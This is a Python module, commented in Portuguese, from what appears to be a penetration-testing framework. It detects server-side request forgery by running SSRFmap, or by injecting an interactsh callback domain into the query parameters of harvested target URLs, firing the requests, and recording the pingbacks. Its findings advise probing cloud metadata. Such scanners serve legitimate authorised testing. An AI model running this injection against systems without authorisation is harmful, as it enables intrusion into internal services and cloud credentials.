#!/usr/bin/env python3
"""
Módulo SSRF Scanner — Utiliza SSRFmap e roteamento do GF
"""
import json
import shutil
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error

def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟧───────────────────────────────────────────────────────────🟧\n"
        f"   📡 {C.BOLD}{C.CYAN}SSRF SCANNER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟧───────────────────────────────────────────────────────────🟧\n"
    )

    outdir = ensure_outdir(target, "ssrf")
    results_file = outdir / "ssrf_results.json"
    
    # Busca pelas URLs filtradas com o GF Patterns no módulo `urls`
    urls_file = Path("output") / target / "urls" / "patterns" / "ssrf_ready.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "patterns" / "ssrf_urls.txt"
        
    if not urls_file.exists():
        warn("   [!] Arquivo de URLs pré-filtradas para SSRF não encontrado. Certifique-se de ter rodado o módulo 'urls' com GF/Qsreplace ativados.")
        results_file.write_text("[]")
        return [str(results_file)]
        
    urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    if not urls:
        warn("   [!] Nenhuma URL candidata a SSRF detectada nos patterns.")
        results_file.write_text("[]")
        return [str(results_file)]

    info(f"   📊 Testando {len(urls)} URLs injetáveis contra SSRF...")

    # Verificar binário SSRFmap
    ssrfmap = shutil.which("ssrfmap")
    
    deduped = []
    
    if ssrfmap:
        info(f"   [i] Orquestrando SSRFmap em background...")
        ssrfmap_out = outdir / "ssrfmap_raw.txt"
        
        # O SSRFmap geralmente roda via requisição crua ou uma URL por vez
        # Vamos usar um wrapper que roda contra todas as URLs na wordlist
        # cmd = [ssrfmap, "-i", str(urls_file), "-o", str(ssrfmap_out)] # Comando fictício genérico dependente da flag real
        # Na ausência da documentação exata, passaremos cada URL (pode ser lento, limitaremos a 10 threads)
        
        def run_ssrfmap(url):
            try:
                proc = subprocess.run(
                    [ssrfmap, "-u", url, "--level", "1"],
                    capture_output=True, text=True, timeout=30
                )
                if proc.stdout and ("vulnerable" in proc.stdout.lower() or "is vulnerable" in proc.stdout.lower()):
                    return url
            except Exception:
                pass
            return None
            
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(run_ssrfmap, u): u for u in urls[:50]} # Top 50 to avoid hours of execution
            for future in as_completed(futures):
                res = future.result()
                if res:
                    deduped.append({
                        "url": res,
                        "type": "SSRF Vulnerability",
                        "severity": "CRITICAL",
                        "details": "Detecção Ativa via SSRFmap",
                        "action": "Checar acesso a metadados do Cloud Provider ou AWS"
                    })
                    info(f"   🚨 {C.RED}SSRF Detectado:{C.END} {res}")
    else:
        warn("   [!] 'ssrfmap' não encontrado. Implementando testes OAST Dinâmicos nativos...")
        import httpx
        from ..http_utils import throttle
        import urllib.parse
        import time
        import re

        interact_bin = shutil.which("interactsh-client")
        if interact_bin:
            info("   [i] Interactsh detectado! Subindo servidor OAST temporal...")
            log_json = outdir / "oast_logs.json"
            
            proc = subprocess.Popen([interact_bin, "-json", "-o", str(log_json)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            oast_url = None
            for _ in range(40):
                line = proc.stdout.readline()
                if not line: break
                
                # Extrai ex: xxxx.oast.pro ou  xxxx.oast.me
                # Log padrão: [INF] xxxx.oast.pro
                match = re.search(r'([a-z0-9\-]+\.[a-z0-9\-]+\.[a-z]+)', line)
                if match and ("oast" in match.group() or "interact" in match.group() or "pingb" in match.group()):
                    oast_url = match.group()
                    break

            if oast_url:
                if not oast_url.startswith("http"):
                    oast_url = "http://" + oast_url
                    
                info(f"   [+] Sessão OAST criada com sucesso: {C.GREEN}{oast_url}{C.END}")
                
                # Envenenar parâmetros na memoria
                injected_urls = set()
                for u in urls[:150]: # Top 150 para prevenir bans
                    parsed = urllib.parse.urlparse(u)
                    if parsed.query:
                        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                        new_qs = "&".join([f"{k}={oast_url}" for k in qs])
                        injected_urls.add(urllib.parse.urlunparse(parsed._replace(query=new_qs)))
                
                info(f"   [+] Disparando {len(injected_urls)} cargas venenosas multi-thread...")

                def shoot(url):
                    throttle()
                    try: httpx.get(url, verify=False, timeout=5)
                    except: pass
                    
                with ThreadPoolExecutor(max_workers=10) as executor:
                    for u in injected_urls:
                        executor.submit(shoot, u)
                        
                info("   [i] Aguardando 10 segundos por interações OAB/DNS Reversas...")
                time.sleep(10)
                
                proc.terminate()
                
                if log_json.exists():
                    try:
                        for entry_line in log_json.read_text(errors="ignore").splitlines():
                            if not entry_line.strip(): continue
                            entry = json.loads(entry_line)
                            
                            deduped.append({
                                "url": f"{entry.get('protocol', 'Unknown')} Interação Capturada",
                                "type": "SSRF / OAST Pingback",
                                "severity": "CRITICAL",
                                "details": f"Conexão do IP alvo: {entry.get('remote-address')} na porta {entry.get('remote-port', 'N/A')}",
                                "action": "Vulnerabilidade Confirmada! Realize SSRF Manual."
                            })
                            info(f"   🚨 {C.RED}Callback OAST Detectado de {entry.get('remote-address')}{C.END}")
                    except Exception as err:
                        error(f"   [-] Erro ao ler Logs do Interactsh: {err}")
            else:
                proc.terminate()
                warn("   [-] Não foi possível extrair a URL de Payload do Interactsh.")
        else:
            warn("   [-] interactsh-client também não está instalado. Pulando SSRF OAST dinâmico.")

    results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
    
    if deduped:
        success(f"💉 {len(deduped)} SSRFs detectados!")
    else:
        success("✅ Nenhum SSRF detectado de forma síncrona.")
    
    return [str(results_file)]
